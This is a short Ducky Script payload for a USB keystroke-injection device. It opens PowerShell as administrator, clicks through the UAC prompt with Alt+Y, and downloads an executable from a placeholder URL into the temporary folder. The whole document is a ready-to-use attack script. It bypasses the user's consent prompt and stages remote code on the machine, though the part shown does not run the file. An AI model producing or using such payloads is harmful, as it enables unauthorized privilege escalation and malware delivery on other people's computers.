DELAY 500
REM Open PowerShell as administrator
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
REM Press Alt+Y to confirm UAC prompt
ALT Y
DELAY 500

REM Replace the URL below with the actual URL of the file to download
STRING $url = "http://example.com/yourfile.exe"; $output = "$env:TEMP\downloadedfile.exe"; Invoke-WebRequest -Uri $url -OutFile $output;
ENTER

DELAY 1000
